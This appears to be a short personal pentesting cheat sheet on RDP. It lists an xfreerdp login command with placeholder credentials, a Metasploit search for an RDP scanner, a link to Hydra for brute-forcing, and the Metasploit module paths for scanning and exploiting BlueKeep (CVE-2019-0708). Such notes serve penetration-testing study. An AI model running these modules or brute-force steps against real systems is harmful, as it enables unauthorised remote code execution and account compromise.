![[Pasted image 20221208070511.png]]

```bash

xfreedp /u:USER /p:PASS /v:IP:PORT

```


# Metasploit

```bash

search rdp_scanner # Check for rdp service running on a port 

```


# Brute force

[Hydra](Hydra) 

# CVE-2019-0708 BlueKeep

## Metasploit

```bash

auxiliary/scanner/rdp/cve_2019_0708_bluekeep

exploit/windows/rdp/cve_2019_0708_bluekeep_rce 

```